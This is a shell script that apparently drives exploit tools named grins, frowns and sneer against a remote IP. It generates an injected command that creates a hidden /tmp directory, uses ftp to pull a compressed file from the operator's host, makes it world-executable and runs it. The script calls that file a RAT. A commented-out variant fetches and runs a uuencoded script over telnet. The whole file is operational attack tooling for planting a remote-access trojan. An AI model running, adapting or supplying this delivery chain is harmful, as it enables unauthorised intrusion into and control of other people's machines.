#!/bin/sh

##########################################################
### Generate & run the following scripts:
### 	- script to upload grinch on target (gr_upload.scr)
### 	- script to upload gr_upload.scr (initial_upload.scr)
### 	- run grins/frowns/whatever using the above scripts
##########################################################

# Some default values
SCRIPT="/tmp/.t"
DIR="/tmp/..."
GS_OPTION=frowns

# Show usage and exit
usage() {
    echo ""
    echo "Before running this script, you first need to run the following:"
    echo "      nc -l -p localPort < file2Xfer&Run.uu"
    echo "      (nc must be in your path; it's also run w/in this script)"
    echo "where file2Xfer&Run.uu is a compressed, uuencoded file."
    echo ""
    echo ""
    echo "Usage: ${0} [options] -- [options to <file2Xfer&Run>]"
    echo "  -i <remoteIP>                (required)"
    echo "  -g <grins|frowns|sneer>      def= $GS_OPTION"
    echo "  -l <localIP>                 (required)"
    echo "  -n <ftp passwd>              (required)"
    echo "  -u <ftp user>                (required)"
    echo "  -f <file2Xfer&Run>           (required)"
    echo "  -D <remoteDir>               def= $DIR"
    exit 1
}

# There must be at least one argument
if [ ${#} -eq 0 ]; then
    usage
fi

#
# Process args
#
    while getopts g:i:l:n:u:f:D: op; do
	case $op in
	g)  GS_OPTION="$OPTARG";;
	i)  REMOTE_IP="$OPTARG";;
	l)  LOCAL_IP="$OPTARG";;
	n)  PASS="$OPTARG";;
	u)  USER="$OPTARG";;
	f)  RUN_FILE="$OPTARG";;
	D)  DIR="$OPTARG";;
	esac
    done
    cmdFlag="-c"
    shift `expr $OPTIND - 1`

    # Check for required args
    [ -z "$REMOTE_IP" ] && echo "Error: missing remote IP" && usage
    [ -z "$LOCAL_IP" ] && echo "Error: missing local IP" && usage
    [ -z "$USER" ] && echo "Need user for login" && usage
    [ -z "$PASS" ] && echo "Need passwd for user" && usage

EXTRA="${*}"

##### ORIG initial_upload.scr
#### /sbin/sh -c (/usr/bin/telnet	$LOCAL_IP	$SCR_UPLOAD_PORT>$SCRIPT.uu	2>/dev/null;/usr/bin/uudecode	$SCRIPT.uu	2>/dev/null;/usr/bin/chmod	700	$SCRIPT;$SCRIPT	2>/dev/null	>/dev/null;)&

echo "Generating initial upload script." 
cat > initial_upload.scr << EOF
/sbin/sh -c (N=/dev/null	D=$DIR	P=$RUN_FILE;	mkdir	\$D;	cd	\$D;	echo	"ftp	-in<<E	>\$N	2>&1\012open	$LOCAL_IP\012user	$USER	$PASS\012bi\012get	\$P.Z\012bye"	>t;	chmod	+x	t;	PATH=\$D:/bin:/usr/bin	t;	uncompress	-f	\$P.Z;	chmod	777	\$P	>\$N	2>&1;	PATH=\$D	\$P)&
EOF

#cat > initial_upload.scr << EOF
#/sbin/sh -c (/usr/bin/telnet	$LOCAL_IP	$SCR_UPLOAD_PORT>$SCRIPT.uu	2>/dev/null;/usr/bin/uudecode	$SCRIPT.uu	2>/dev/null;/usr/bin/chmod	700	$SCRIPT;$SCRIPT	2>/dev/null	>/dev/null;)&
#EOF

echo "Not Generating grinch upload script." 

### uuencode gr_upload.scr

echo "You now need to set up your ftp stuff"
echo ""
echo "passwd $USER"
echo "$PASS"
echo "$PASS"
echo ""
echo "Test this out and make sure you copy the right RAT to the directory"
echo "ftp localhost"
echo "$USER"
echo "$PASS"
echo "pwd"
echo "ls -l $RUN_FILE.Z"
echo "bye"

echo "(Hit return when you've got these started)"
read input


echo "now running:  "
echo "  ./${GS_OPTION} ${REMOTE_IP} ./initial_upload.scr public "
./${GS_OPTION} ${REMOTE_IP} ./initial_upload.scr public

echo "Thank you for playing"

### echo "removing intermediate scripts"
### rm ./gr_upload.scr ./initial_upload.scr ./gr_upload.uu 

echo Done.
echo
echo "Don't forget to look for stray telnets running on target."
echo "If there are you are totally hosed because you didn't use ftp."
